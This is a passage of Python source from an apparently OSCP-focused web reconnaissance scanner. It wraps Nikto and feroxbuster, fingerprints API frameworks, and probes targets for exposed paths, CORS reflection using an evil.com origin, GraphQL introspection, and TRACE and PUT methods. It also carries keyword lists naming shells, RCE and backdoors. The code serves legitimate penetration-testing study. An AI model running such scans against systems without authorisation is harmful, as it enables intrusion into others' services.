            ver_m = re.search(r"iis[/\s]([\d.]+)", d, re.I)
            ver = ver_m.group(1) if ver_m else "?"
            _add(f"IIS {ver} version via error page → searchsploit iis {ver}")

        # ── Stack trace / path disclosure ────────────────────────────────────
        if re.search(r"traceback|stack trace|exception in thread", d):
            _add("⚡ STACK TRACE in error response → read carefully for internal paths/class names")

        # Werkzeug interactive debugger — game over if accessible
        if "werkzeug" in d and "debugger" in d:
            _add("💀 WERKZEUG DEBUGGER active → interactive Python REPL at /__debugger__? → RCE")
        elif "werkzeug" in tech_blob and re.search(r"debugger|pin", d):
            _add("⚡ Werkzeug debug clue in error — check /__debugger__? for interactive console")

        # Django DEBUG=True
        if "django" in d and re.search(r"debug|settings|urls\.py|wsgi", d):
            _add("⚡ Django DEBUG mode likely ON → error pages expose settings, URL patterns, env vars")

        # Absolute paths on disk
        for path_m in re.finditer(r"(/(?:var|home|usr|etc|opt|srv|tmp|app|root)/[^\s\"'<>]{3,60})", disclosure):
            _add(f"Path disclosure: {path_m.group(1)[:80]} → add to LFI wordlist")

        # Internal hostnames / IP addresses in errors
        for ip_m in re.finditer(r"\b(10\.\d+\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+)\b", disclosure):
            _add(f"Internal IP in error page: {ip_m.group(1)} → possible backend / pivot target")

    return findings[:20]


OSCP_ALLOWED_TOOLS_NOTE = (
    "# Tools: Nmap NSE, Nikto, Gobuster/DirBuster, sslscan, WhatWeb, wafw00f, "
    "searchsploit, enum4linux, manual probes — all OSCP-permitted.\n"
    "# Excluded: Nuclei, OpenVAS/Nessus, mass auto-exploit frameworks.\n"
    "# Reference: https://help.offsec.com/hc/en-us/articles/360040165632"
)


# Keywords that make a Nikto finding high-priority (shown in RED)
_NIKTO_HIGH_VALUE = (
    "interesting", "/dev/", "/backup", "/bak", "/old", "/test", "/temp", "/tmp",
    "/admin", "/administrator", "/config", "/conf", "/configuration",
    "/db/", "/database/", "/sql/", "/phpmyadmin", "/mysql", "/mssql",
    "/git/", "/.git", "/.env", "/.htaccess", "/.htpasswd",
    "cve-", "osvdb-", "ms0", "ms1", "ms2",
    "bypass", "upload", "inject", "exec", "shell", "rce", "backdoor",
    "dangerous", "default password", "default credential",
    "file is publicly accessible", "server leaks",
    "stack trace", "error message", "path disclosure",
    "directory listing", "index of", "parent directory",
    "phpinfo", "info.php", "test.php", "server-status", "server-info",
    "robots.txt", "crossdomain.xml", "clientaccesspolicy",
)

def run_nikto(url: str, tuning: str, extra_args: list = None,
              skip_event=None, on_finding=None, max_seconds: int = 180) -> str:
    """Run nikto — runs until naturally finished or skip_event set.
    on_finding(line, is_high): optional callback for live dashboard updates.
    When on_finding is set, findings are NOT printed live (captured in thread buffer).
    Returns full raw output as string.
    """
    _nikto_target = normalize_nikto_target(url)
    cmd = ["nikto", "-h", _nikto_target, "-Tuning", tuning, "-nointeractive"]
    if extra_args:
        cmd.extend(extra_args)
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
        lines = []
        _start = time.time()
        for line in proc.stdout:
            if max_seconds and (time.time() - _start) > max_seconds:
                with print_lock:
                    print(f"  {C.YELLOW}  ↷ Nikto timed out after {max_seconds}s — moving on{C.END}")
                proc.terminate()
                try:
                    proc.wait(timeout=3)
                except Exception:
                    try:
                        proc.kill()
                    except Exception:
                        pass
                return "\n".join(lines)
            # Check skip flag — user pressed Enter to skip nikto
            if skip_event and skip_event.is_set():
                with print_lock:
                    print(f"  {C.YELLOW}  ↷ Nikto skipped (Enter pressed){C.END}")
                proc.terminate()
                proc.wait()
                return "\n".join(lines)
            line_s = line.rstrip()
            lines.append(line_s)
            ls = line_s.strip()
            ll = ls.lower()
            # Silently skip "nikto.pl not found" and similar install errors
            if ("not found" in ll and ("nikto.pl" in ll or "exec:" in ll)) or                ("no such file" in ll and "nikto" in ll):
                with print_lock:
                    print(f"    {C.YELLOW}[!] Nikto broken: nikto.pl missing{C.END}")
                    print(f"    {C.GREY}    Fix 1: sudo apt-get install --reinstall nikto perl{C.END}")
                    print(f"    {C.GREY}    Fix 2: sudo curl -o /var/lib/nikto/nikto.pl https://raw.githubusercontent.com/sullo/nikto/master/program/nikto.pl && sudo chmod +x /var/lib/nikto/nikto.pl{C.END}")
                proc.terminate()
                return ""
            if ls.startswith("+"):
                # Skip boilerplate + lines (informational only, already shown)
                _skip_plus = (
                    "out of date", "your nikto installation",
                    "retrieved x-aspnet", "retrieved x-powered",
                    "no cgi directories", "cgi tests skipped",
                    "target ip:", "target hostname:", "target port:",
                    "start time:", "end time:", "platform:",
                    "nikto v", "1 host", "host(s) tested",
                    "+ server:",  # pure Server: banner line
                )
                if any(x in ll for x in _skip_plus):
                    continue
                _is_high = any(x in ll for x in _NIKTO_HIGH_VALUE)
                if on_finding:
                    # Dashboard mode: notify callback for live slot update only.
                    # The finding is captured in the thread buffer and printed
                    # as part of the port's complete output block when done.
                    on_finding(ls, _is_high)
                else:
                    # Legacy / non-parallel mode: print live to stdout.
                    _col = C.RED if _is_high else C.DIM
                    with print_lock:
                        print(f"    {_col}{ls[:240]}{C.END}")
            elif ls.startswith("-"):
                # Separator lines (----) — skip silently
                pass
            elif any(x in ll for x in (
                    "target ip:", "target hostname:", "target port:",
                    "nikto v", "start time:", "end time:", "platform:",
                    "host(s) tested", "items checked", "error", "1 host")):
                pass  # skip all boilerplate header/footer
            # request-count summary lines and noise IDs — silently skip
            # (already filtered in _nikto_filter; suppress in live stream too)
            # All other non-+ lines (blank lines, etc.) — silently skip
        proc.wait()
        return "\n".join(lines)
    except Exception as e:
        return f"[nikto error: {e}]"

def _nikto_filter(raw: str) -> list:
    """Extract real finding lines from nikto output, stripping boilerplate and redundant noise.

    Filtered out:
    - [013587] "Suggested security header missing" — already shown in Security Headers block
    - [007342]/[007352] X-Frame-Options/X-Content-Type-Options warnings — same reason
    - Request count summary lines ("+ 2632 requests: 0 errors...")
    - All standard boilerplate (target IP, start time, etc.)
    """
    # IDs that are pure header-hygiene noise — already covered by Security Headers section
    _noise_ids = {"013587", "007342", "007352", "999998"}
    _skip = (
        "target ip:", "target hostname:", "target port:", "start time:",
        "end time:", "platform:", "nikto v", "items checked",
        "error(s)", "out of date", "no cgi directories", "cgi tests skipped",
        "scan terminated", "host(s) tested", "retrieved x-aspnet",
        "retrieved x-powered",
    )
    _lines = []
    for _l in (raw or "").splitlines():
        _ls = _l.strip()
        if not _ls.startswith("+"):
            continue
        _ll = _ls.lower()
        # Skip boilerplate
        if any(x in _ll for x in _skip):
            continue
        # Skip bare "Server: X" lines
        if re.match(r"^\+\s+Server:\s+\S+\s*$", _ls):
            continue
        # Skip request-count summary lines  e.g. "+ 2632 requests: 0 errors..."
        if re.match(r"^\+\s+\d+ requests:", _ls):
            continue
        # Skip noise finding IDs (security headers already shown in port block)
        _id_m = re.search(r"\[([0-9a-f]+)\]", _ls)
        if _id_m and _id_m.group(1) in _noise_ids:
            continue
        _lines.append(_ls)
    return _lines

def normalize_nikto_target(url: str) -> str:
    """Normalize user/web-mode URLs into a Nikto-friendly base target.

    Nikto is happiest with scheme://host[:port]/ and can appear to hang longer on
    needlessly specific paths. Keep the scan rooted at the site base.
    """
    try:
        p = urlparse((url or '').strip())
        if not p.scheme or not p.hostname:
            return url
        port = p.port
        default_port = 443 if p.scheme.lower() == 'https' else 80
        port_part = f":{port}" if port and port != default_port else ''
        return f"{p.scheme.lower()}://{p.hostname}{port_part}/"
    except Exception:
        return url

def _nikto_is_functional() -> bool:
    """Return True only if nikto is installed AND nikto.pl is actually present."""
    if not shutil.which("nikto"):
        return False
    # Check known nikto.pl locations (Kali 2024+ has it at /usr/share/nikto/nikto.pl)
    for _pl_path in ("/usr/share/nikto/nikto.pl",       # Kali 2024+
                     "/var/lib/nikto/nikto.pl",           # symlink or older installs
                     "/usr/lib/nikto/nikto.pl",
                     "/opt/nikto/nikto.pl"):
        if os.path.isfile(_pl_path):
            return True
    # Fall back to running nikto -Version
    try:
        r = subprocess.run(["nikto", "-Version"], capture_output=True, text=True, timeout=5)
        out = (r.stdout or "") + (r.stderr or "")
        if "not found" in out.lower() or "no such file" in out.lower():
            return False
        return "nikto" in out.lower()
    except Exception:
        return False

# Cached at startup so we don't re-check on every port
_NIKTO_FUNCTIONAL: Optional[bool] = None

def nikto_ok() -> bool:
    global _NIKTO_FUNCTIONAL
    if _NIKTO_FUNCTIONAL is None:
        _NIKTO_FUNCTIONAL = _nikto_is_functional()
        if not _NIKTO_FUNCTIONAL and shutil.which("nikto"):
            print(f"{C.YELLOW}[!] Nikto installed but nikto.pl not found{C.END}")
            print(f"    {C.GREY}Fix: sudo curl -o /var/lib/nikto/nikto.pl https://raw.githubusercontent.com/sullo/nikto/master/program/nikto.pl && sudo chmod +x /var/lib/nikto/nikto.pl{C.END}")
    return bool(_NIKTO_FUNCTIONAL)


# ── API detection and enumeration ─────────────────────────────────────────────

# Paths that strongly indicate a REST/GraphQL/OpenAPI service is present
_API_INDICATOR_PATHS = frozenset([
    "/api/", "/api/v1/", "/api/v2/", "/api/v3/",
    "/rest/", "/rest/v1/",
    "/v1/", "/v2/", "/v3/",
    "/graphql", "/graphiql", "/playground",
    "/swagger", "/swagger.json", "/swagger-ui.html",
    "/openapi.json", "/api-docs", "/v2/api-docs", "/v3/api-docs",
    "/docs", "/redoc",
])

# Known API framework fingerprints: {keyword_in_response -> (framework, description)}
_API_FRAMEWORK_SIGS: List[tuple] = [
    # OpenAPI / Swagger UI
    ("swagger-ui",          "Swagger UI",          "OpenAPI/Swagger documented REST API"),
    ("swagger.json",        "Swagger/OpenAPI",     "OpenAPI spec endpoint"),
    ("openapi",             "OpenAPI",             "OpenAPI specification present"),
    ("redoc",               "ReDoc",               "ReDoc OpenAPI documentation"),
    # Python frameworks
    ("fastapi",             "FastAPI",             "Python FastAPI — try /docs and /openapi.json"),
    ("uvicorn",             "Uvicorn/FastAPI",     "Python ASGI — likely FastAPI or Starlette"),
    ("starlette",           "Starlette",           "Python Starlette ASGI framework"),
    ("flask-restful",       "Flask-RESTful",       "Python Flask REST API"),
    ("flask_restx",         "Flask-RESTX",         "Python Flask-RESTX — Swagger at /"),
    ("connexion",           "Connexion",           "Python Connexion OpenAPI framework"),
    ("tornado",             "Tornado",             "Python Tornado async web framework"),
    # Node.js
    ("express",             "Express.js",          "Node.js Express REST API"),
    ("fastify",             "Fastify",             "Node.js Fastify REST API"),
    ("nest",                "NestJS",              "Node.js NestJS — try /api for Swagger"),
    ("strapi",              "Strapi",              "Node.js Strapi headless CMS API"),
    ("hapi",                "Hapi.js",             "Node.js Hapi REST API"),
    # Java/Spring
    ("spring",              "Spring Boot",         "Java Spring Boot — try /actuator and /swagger-ui.html"),
    ("springfox",           "Spring Boot",         "Java Spring Boot with Springfox Swagger"),
    ("springdoc",           "Spring Boot",         "Java Spring Boot with SpringDoc OpenAPI"),
    # Ruby
    ("grape",               "Grape",               "Ruby Grape API framework"),
    ("rails",               "Ruby on Rails",       "Rails API — try /rails/info/routes"),
    # .NET
    ("asp.net core",        "ASP.NET Core",        ".NET Core REST API — try /swagger"),
    ("microsoft.aspnetcore","ASP.NET Core",        ".NET Core API"),
    # GraphQL
    ("graphql",             "GraphQL",             "GraphQL API — run introspection query"),
    ("__schema",            "GraphQL",             "GraphQL introspection available"),
    # Generic REST hints
    ("application/json",    "REST API",            "JSON API response detected"),
    ('"status"',            "REST API",            "JSON status field — likely REST API"),
    ('"message"',           "REST API",            "JSON message field — likely REST API"),
    ('"data"',              "REST API",            "JSON data field — likely REST API"),
    ('"error"',             "REST API",            "JSON error field — likely REST API"),
]

def detect_api_type(host: str, port: int, use_ssl: bool,
                    probe_hits: List, body: str, tech: List[str],
                    whatweb_out: str = "") -> Dict[str, str]:
    """Detect API framework/type from probe hits, response body, and tech stack.

    Returns dict with keys: 'framework', 'description', 'path', 'spec_url'
    or empty dict if nothing conclusive found.
    """
    result: Dict[str, str] = {}
    api_paths_found = [p.path for p in probe_hits if p.path in _API_INDICATOR_PATHS and p.status in ("200", "401", "403")]
    if not api_paths_found:
        # Check looser match
        api_paths_found = [p.path for p in probe_hits
                           if any(api_kw in (p.path or "").lower() for api_kw in
                                  ("/api", "/rest", "/graphql", "/swagger", "/openapi", "/v1/", "/v2/"))
                           and p.status in ("200", "401", "403")]
    if not api_paths_found:
        return result

    # Gather all text signals
    all_text = (body or "").lower() + " " + " ".join(t.lower() for t in tech) + " " + (whatweb_out or "").lower()

    # Probe the best API path for richer fingerprinting
    _best_path = next((p for p in api_paths_found if p in ("/api/", "/api/v1/", "/graphql", "/swagger.json", "/openapi.json")), api_paths_found[0])
    _api_resp = http_request_raw(host, port, _best_path, use_ssl, method="GET", timeout=2.0, max_bytes=16000)
    _api_body = http_body_text(_api_resp).lower() if _api_resp else ""
    _api_hdrs = http_headers(_api_resp) if _api_resp else {}

    combined_signals = all_text + " " + _api_body + " " + " ".join(v.lower() for v in _api_hdrs.values())

    # Check for OpenAPI/Swagger spec at known paths
    for spec_path in ("/swagger.json", "/openapi.json", "/api/swagger.json",
                      "/v2/api-docs", "/v3/api-docs", "/api-docs"):
        _sr = http_request_raw(host, port, spec_path, use_ssl, method="GET", timeout=1.5, max_bytes=8000)
        if _sr and http_status_code(_sr) == "200":
            _sb = http_body_text(_sr).lower()
            if '"openapi"' in _sb or '"swagger"' in _sb or '"info"' in _sb:
                result["spec_url"] = spec_path
                result["framework"] = "OpenAPI/Swagger"
                result["description"] = f"OpenAPI spec at {spec_path} — import into Burp/Postman"
                result["path"] = _best_path
                break

    # Match framework signatures
    if not result.get("framework"):
        for sig, fw, desc in _API_FRAMEWORK_SIGS:
            if sig in combined_signals:
                result["framework"] = fw
                result["description"] = desc
                result["path"] = _best_path
                break

    if not result and api_paths_found:
        result["framework"] = "REST API"
        result["description"] = "API endpoint detected — enumerate with feroxbuster"
        result["path"] = api_paths_found[0]

    return result


def run_api_ferox(base_url: str, api_path: str = "/api/", timeout: int = 60) -> List[Dict[str, str]]:
    """Run feroxbuster against an API path with an API-focused wordlist for ``timeout`` seconds.

    Uses raft-large-words (best API enumeration wordlist) with json/yaml extensions.
    Partial results are captured even if feroxbuster is cut off by the timeout.
    Returns list of {path, status, size, words} dicts.
    """
    if not shutil.which("feroxbuster"):
        return []

    _WL_CANDIDATES = [
        "/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt",
        "/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt",
        "/usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt",
        "/usr/share/wordlists/dirb/common.txt",
    ]
    wordlist = next((w for w in _WL_CANDIDATES if os.path.isfile(w)), "")
    if not wordlist:
        return []

    target_url = base_url.rstrip("/") + api_path
    cmd = [
        "feroxbuster",
        "-u", target_url,
        "-w", wordlist,
        "-x", "json,yaml,yml,txt,html,xml",
        "--threads", "50",
        "--no-recursion",
        "--no-state",
        "--auto-tune",
        "-C", "404",
        "-q",
    ]
    if target_url.startswith("https://"):
        cmd.append("-k")

    _env = os.environ.copy()
    _env.update({"PAGER": "cat", "TERM": "dumb", "NO_COLOR": "1", "RUST_BACKTRACE": "0"})

    raw = ""
    timed_out = False
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                text=True, env=_env)
        try:
            out, _ = proc.communicate(timeout=timeout)
            raw = out or ""
        except subprocess.TimeoutExpired:
            timed_out = True
            proc.terminate()
            try:
                out, _ = proc.communicate(timeout=3)
                raw = out or ""
            except subprocess.TimeoutExpired:
                proc.kill()
                out, _ = proc.communicate()
                raw = out or ""
    except Exception:
        return []

    results: List[Dict[str, str]] = []
    host_only = f"{urlparse(target_url).scheme}://{urlparse(target_url).netloc}"
    for line in raw.splitlines():
        line = re.sub(r"\x1b\[[0-9;]*m", "", line).strip()
        if not line or line.startswith(("Scanning:", "::", "___", "v2.")):
            continue
        m = re.search(r"^(\d{3})\s+GET\s+\d+l\s+(\d+)w\s+([\d-]+)c\s+(https?://\S+)", line)
        if not m:
            continue
        status, words, size, hit_url = m.groups()
        if hit_url.startswith(host_only):
            path = hit_url[len(host_only):] or "/"
        else:
            path = urlparse(hit_url).path or "/"
        results.append({
            "path": path,
            "status": status,
            "words": words,
            "size": "0" if size == "-" else size,
        })

    if timed_out and not results:
        return [{"path": "(timeout — no results yet)", "status": "0", "size": "0", "words": "0"}]
    return results[:80]


def http_analyze(host: str, port: int, is_ssl: bool, web_probe_count: int,
                 whatweb_timeout: int, wafw00f_timeout: int,
                 show_robot_body: bool, vhost: str = "") -> PortResult:
    """Analyse an HTTP port. If vhost is given, it is used as the Host header
    (and in the displayed URL) while the TCP connection goes to host (the IP).
    This ensures normal scans and --url scans produce identical results."""

    pr = PortResult(port=port, service_guess=COMMON_SERVICES.get(port, "Unknown"),
                    detected_service="HTTP", is_ssl=is_ssl)
    scheme = "https" if is_ssl else "http"
    _connect_host = host  # always connect to IP/hostname as given
    _host_hdr     = vhost if vhost else host  # Host: header
    pr.url = f"{scheme}://{_host_hdr}:{port}/"

    # === Check for HTTP redirects ===
    redir = check_http_redirects(_connect_host, port, is_ssl)
    if redir:
        pr.redirect_url = redir
        # Extract domain from redirect URL and record it
        redir_domain = extract_domain_from_url(redir)
        if redir_domain and redir_domain not in HOSTNAME_CACHE["redirects"]:
            HOSTNAME_CACHE["redirects"].add(redir_domain)
            HOSTNAME_CACHE["all"].add(redir_domain)
            record_domain(redir_domain, source=f"redirect:{port}")

    # Root fetch
    root = http_request_raw(_connect_host, port, "/", is_ssl, method="GET", timeout=2.3, max_bytes=220000, host_header=_host_hdr)
    body_t = ""
    if root:
        head_b, body_b = split_http_bytes(root)
        head_t = safe_decode(head_b)
        body_t = safe_decode(body_b)

        lines = head_t.splitlines()
        pr.status_line = lines[0].strip() if lines else ""
        pr.title = extract_title(body_t)
        pr.methods = fetch_allow_methods(host, port, is_ssl)

        hdrs = http_headers(root)
        # keep versions in headers
        for k in ("Server", "X-Powered-By", "X-Generator", "X-Jenkins", "X-AspNet-Version",
                   "X-AspNetMvc-Version", "X-Drupal-Cache", "X-Varnish", "X-Runtime"):
            if k in hdrs and hdrs[k] and hdrs[k] not in pr.tech:
                pr.tech.append(f"{k}: {hdrs[k]}")

        # body fingerprints (expanded)
        body_low = body_t.lower()
        body_tech = [
            ("wp-content", "WordPress"),
            ("wp-includes", "WordPress"),
            ("csrfmiddlewaretoken", "Django"),
            ("laravel", "Laravel"),
            ("werkzeug", "Werkzeug"),
            ("flask", "Flask"),
            ("__viewstate", "ASP.NET"),
            ("jquery", "jQuery"),
            ("bootstrap", "Bootstrap"),
            ("webmin", "Webmin"),
            ("grafana", "Grafana"),
            ("kibana", "Kibana"),
            ("elasticsearch", "Elasticsearch"),
            ("couchdb", "CouchDB"),
            ("nagios", "Nagios"),
            ("zabbix", "Zabbix"),
            ("moodle", "Moodle"),
            ("mantisbt", "MantisBT"),
            ("phpbb", "phpBB"),
            ("owncloud", "ownCloud"),
            ("nextcloud", "Nextcloud"),
            ("roundcube", "Roundcube"),
            ("squirrelmail", "SquirrelMail"),
            ("nostromo", "Nostromo"),
            ("openemr", "OpenEMR"),
            ("glpi", "GLPI"),
            ("prtg", "PRTG"),
            ("cacti", "Cacti"),
            ("nibbleblog", "Nibbleblog"),
            ("getsimple", "GetSimpleCMS"),
            ("cuppa", "CuppaCMS"),
            ("litecart", "LiteCart"),
            ("concrete5", "Concrete5"),
            ("bolt", "BoltCMS"),
        ]
        for needle, name in body_tech:
            if needle in body_low and name not in pr.tech:
                pr.tech.append(name)

        pr.users = extract_users(body_t)
        pr.emails = extract_emails(body_t)
        pr.comments = extract_comments(body_t)
        pr.dev_notes.extend(find_dev_notes(body_t, pr.url))

        # === Extract cookies from root response ===
        pr.cookies = extract_cookies(root)

        # === Extract forms (login, upload, etc.) ===
        pr.forms = extract_forms(body_t, pr.url)

    # === SSL certificate info (hostnames, internal names) ===
    if is_ssl:
        pr.ssl_cert_info = extract_ssl_cert_info(host, port)
        # Extract domains from SSL certificate and record them
        ssl_domains = extract_domains_from_ssl_cert(pr.ssl_cert_info)
        for ssl_dom in ssl_domains:
            if ssl_dom not in HOSTNAME_CACHE["ssl_certs"]:
                HOSTNAME_CACHE["ssl_certs"].add(ssl_dom)
                HOSTNAME_CACHE["all"].add(ssl_dom)
                record_domain(ssl_dom, source=f"ssl_cert:{port}")
        # HTTP/2 ALPN detection — flag h2 support for recon note
        if detect_http2_alpn(host, port):
            if "HTTP/2" not in pr.tech:
                pr.tech.append("HTTP/2")

    # robots.txt (YES/NO + content if readable)
    robots = http_request_raw(_connect_host, port, "/robots.txt", is_ssl, method="GET", timeout=2.0, max_bytes=90000, host_header=_host_hdr)
    if robots:
        code = http_status_code(robots)
        pr.robots.status = code
        pr.robots.present = code in ("200", "301", "302", "401", "403")
        if show_robot_body and code == "200":
            pr.robots.snippet = http_body_text(robots).strip()[:12000]

    # sitemap.xml (YES/NO only)
    sm = http_request_raw(_connect_host, port, "/sitemap.xml", is_ssl, method="GET", timeout=2.0, max_bytes=3000, host_header=_host_hdr)
    if sm:
        code = http_status_code(sm)
        pr.sitemap_status = code
        pr.sitemap_present = code in ("200", "301", "302", "401", "403")
    else:
        pr.sitemap_present = False

    # === Soft-404 / wildcard detection (enhanced: size + word-count baseline) ===
    is_wildcard, wc_status, wc_bodylen = detect_soft_404(host, port, is_ssl)
    pr.is_wildcard_404 = is_wildcard
    pr.wildcard_status = wc_status
    # Extra word-count sample for more robust wildcard filtering (avoids size-only false negatives)
    _wc_words = 0
    if is_wildcard:
        _raw2 = http_request_raw(host, port,
                                 "/" + "".join(random.choices(string.ascii_lowercase, k=14)) + ".html",
                                 is_ssl, method="GET", timeout=1.5, max_bytes=8000)
        _wc_words = len(http_body_text(_raw2).split()) if _raw2 else 0

    # === CORS misconfiguration check ===
    _cors_probe = http_request_raw(host, port, "/", is_ssl, method="GET", timeout=1.5, max_bytes=4096,
                                   headers={"Origin": "https://evil.com"})
    if _cors_probe:
        _ch = http_headers(_cors_probe)
        _acao = _ch.get("Access-Control-Allow-Origin", "")
        _acac = _ch.get("Access-Control-Allow-Credentials", "")
        if _acao == "*" or (_acao and "evil.com" in _acao):
            _cors_note = f"CORS:ACAO={_acao[:40]}"
            if _acac.lower() == "true":
                _cors_note += "+ACAC=true ⚡ cred-theft"
            if not any("CORS" in t for t in pr.tech):
                pr.tech.append(_cors_note)

    # === CSP header analysis — reveals internal domains / insecure directives ===
    _root_hdrs_post = http_headers(root) if root else {}
    _csp = (_root_hdrs_post.get("Content-Security-Policy", "")
            or _root_hdrs_post.get("Content-Security-Policy-Report-Only", ""))
    if _csp:
        for _csp_dom in re.findall(r"https?://([A-Za-z0-9._-]+)", _csp):
            if _looks_like_domain(_csp_dom) and not _is_ip(_csp_dom):
                record_domain(_csp_dom, source=f"csp:{port}")
        if "unsafe-inline" in _csp or "unsafe-eval" in _csp:
            if not any("CSP" in t for t in pr.tech):
                pr.tech.append("CSP:unsafe-directives ⚡")

    # === HTTP/2 detection (ALPN via SSL) ===
    if is_ssl and not pr.http2:
        try:
            _h2_ctx = ssl.create_default_context()
            _h2_ctx.check_hostname = False
            _h2_ctx.verify_mode = ssl.CERT_NONE
            _h2_ctx.set_alpn_protocols(["h2", "http/1.1"])
            _h2_raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            _h2_raw.settimeout(2.0)
            _h2_ssl = _h2_ctx.wrap_socket(_h2_raw, server_hostname=host)
            _h2_ssl.connect((host, port))
            if _h2_ssl.selected_alpn_protocol() == "h2":
                pr.http2 = True
                if "HTTP/2" not in pr.tech:
                    pr.tech.append("HTTP/2")
            _h2_ssl.close()
        except Exception:
            pass

    # Extra probes – PARALLELISED (up to 20 threads). Was sequential: 100 probes × 1.35s = 135s worst case.
    probe_list = WEB_PROBE_TOP[:]
    if web_probe_count > len(probe_list):
        probe_list += WEB_PROBE_CATALOG[: max(0, web_probe_count - len(probe_list))]
    probe_list = [p for p in probe_list[:web_probe_count] if p not in ("/robots.txt", "/sitemap.xml")]

    _SENSITIVE_403 = frozenset(["/.git", "/.svn", "/.hg", "/.env", "/admin", "/manager",
                                 "/server-status", "/actuator", "/console", "/.htpasswd",
                                 "/WEB-INF", "/META-INF", "/backup", "/config"])
    _probe_lock = threading.Lock()
    _hits = 0
    _probe_results: List[WebCheck] = []
    _sensitive_buf: Dict[str, str] = {}

    def _run_one_probe(pth: str):
        nonlocal _hits
        if shutdown_flag.is_set() or _hits >= 30:
            return
        resp = http_request_raw(host, port, pth, is_ssl, method="GET", timeout=1.1, max_bytes=16000)
        if not resp:
            return
        code = http_status_code(resp)
        if code not in ("200", "301", "302", "401", "403"):
            return
        # Enhanced wildcard filter: check BOTH body size and word-count before skipping
        if is_wildcard and code == wc_status:
            pbody = http_body_text(resp).strip()
            _size_match = abs(len(pbody) - wc_bodylen) < max(50, wc_bodylen * 0.15)
            _word_match = _wc_words > 0 and abs(len(pbody.split()) - _wc_words) < max(5, _wc_words * 0.15)
            _sens_403 = code == "403" and any(pth.startswith(s) for s in _SENSITIVE_403)
            if (_size_match or _word_match) and not _sens_403:
                return
        with _probe_lock:
            if _hits >= 30:
                return
            _probe_results.append(WebCheck(path=pth, status=code, present=True))
            _hits += 1
            if code == "200" and pth in SENSITIVE_PROBE_PATHS:
                bc = http_body_text(resp).strip()[:3000]
                if bc and len(bc) > 2:
                    _sensitive_buf[pth] = bc

    _nw = min(20, max(5, len(probe_list) // 5 + 1))
    with cf.ThreadPoolExecutor(max_workers=_nw) as _pex:
        list(_pex.map(_run_one_probe, probe_list))

    hits = _hits
    pr.probes.extend(_probe_results)
    pr.sensitive_files.update(_sensitive_buf)

    # === GraphQL introspection (if /graphql endpoint returned 200) ===
    _gql_hits = [p for p in pr.probes if any(x in (p.path or "") for x in ("/graphql", "/graphiql", "/api/graphql")) and p.status == "200"]
    if _gql_hits:
        _gql_q = '{"query":"{__schema{queryType{name}types{name kind}}}"}'
        _gql_r = http_request_raw(host, port, _gql_hits[0].path, is_ssl, method="POST",
                                  timeout=3.0, max_bytes=32000,
                                  headers={"Content-Type": "application/json"})
        if _gql_r:
            _gql_body = http_body_text(_gql_r)
            if "__schema" in _gql_body or "queryType" in _gql_body:
                pr.graphql_path = _gql_hits[0].path
                if not any("GraphQL" in t for t in pr.tech):
                    pr.tech.append("GraphQL:introspection-ENABLED ⚡")
                _gtypes = re.findall(r'"name"\s*:\s*"([A-Za-z][A-Za-z0-9_]{2,})"', _gql_body)
                if _gtypes:
                    pr.sensitive_files[_gql_hits[0].path + " [introspection]"] = (
                        "Types: " + ", ".join(sorted(set(_gtypes))[:40])
                    )

    # WhatWeb always for web if installed (do not show as enum; show result)
    if shutil.which("whatweb"):
        pr.whatweb_out = run_cmd(["whatweb", "-a", "3", pr.url], timeout=whatweb_timeout)
        for t in parse_whatweb_tech(pr.whatweb_out):
            if t not in pr.tech:
                pr.tech.append(t)

    # wafw00f always for web if installed (hard timeout)
    if shutil.which("wafw00f"):
        pr.wafw00f_out = run_cmd(["wafw00f", pr.url], timeout=wafw00f_timeout)
        pr.waf_detected = parse_wafw00f(pr.wafw00f_out)

    # NOTE: nikto is intentionally NOT run inside http_analyze().
    # It is run by the caller (_nikto_task in the deep check pool) AFTER the
    # port block is printed, so output stays grouped and in order.
    # For --url mode, nikto is run separately in the --url code path.

    # === CMS / App version extraction ===
    pr.cms_versions = extract_cms_version(pr.title or "", body_t, pr.tech, pr.whatweb_out)

    # === Auto-searchsploit on detected versions ===
    if shutil.which("searchsploit") and pr.cms_versions:
        pr.searchsploit_results = auto_searchsploit(pr.cms_versions)

    # === Scan JS assets for secrets/API keys ===
    if body_t:
        assets = extract_assets(body_t, pr.url, host, port)
        if assets:
            pr.js_secrets = scan_js_for_secrets(assets, host, port, is_ssl)

    # Dedup dev notes
    if pr.dev_notes:
        seen = set()
        uniq = []
        for dn in pr.dev_notes:
            k = (dn.get("url"), dn.get("line"), dn.get("col"), dn.get("keyword"), dn.get("note"))
            if k in seen:
                continue
            seen.add(k)
            uniq.append(dn)
        pr.dev_notes = uniq[:25]

    # ── Advanced analysis (security headers, CORS, HTTP/2, JWT, open-redirect) ──
    root_for_hdrs = http_request_raw(_connect_host, port, "/", is_ssl, method="HEAD",
                                     timeout=1.5, max_bytes=4096, host_header=_host_hdr)
    if root_for_hdrs:
        pr.security_headers = analyze_security_headers(root_for_hdrs, is_ssl)
        pr.websocket = detect_websocket(root_for_hdrs)

    pr.cors_vuln = detect_cors_reflection(host, port, is_ssl, path="/")

    if is_ssl:
        pr.http2 = detect_http2(host, port)

    if body_t:
        pr.jwt_tokens = detect_jwt_tokens(
            root_for_hdrs if root_for_hdrs else b"", body_t
        )

    pr.open_redirect = detect_open_redirect(host, port, is_ssl)

    # Spring Boot Actuator probe
    actuator_blob = " ".join(pr.tech + list(pr.cms_versions.keys())).lower()
    if any(x in actuator_blob for x in ("spring", "java", "tomcat")) or any(
        p.path.startswith("/actuator") for p in pr.probes
    ):
        pr.actuator_paths = check_spring_actuator(host, port, is_ssl)

    # GraphQL probe
    if not any("/graphql" in p.path for p in pr.probes):
        gql = check_graphql(host, port, is_ssl)
        if gql:
            pr.graphql_path = gql

    # ── Extended OSCP-compliant recon ────────────────────────────────────────

    # TLS audit (sslscan / testssl)
    if is_ssl:
        pr.sslscan_out = run_sslscan(host, port)

    # HTTP TRACE (Cross-Site Tracing)
    pr.trace_enabled = check_http_trace(host, port, is_ssl)

    # HTTP PUT method check
    pr.put_enabled = check_http_put(host, port, is_ssl)

    # WordPress user enumeration via REST API
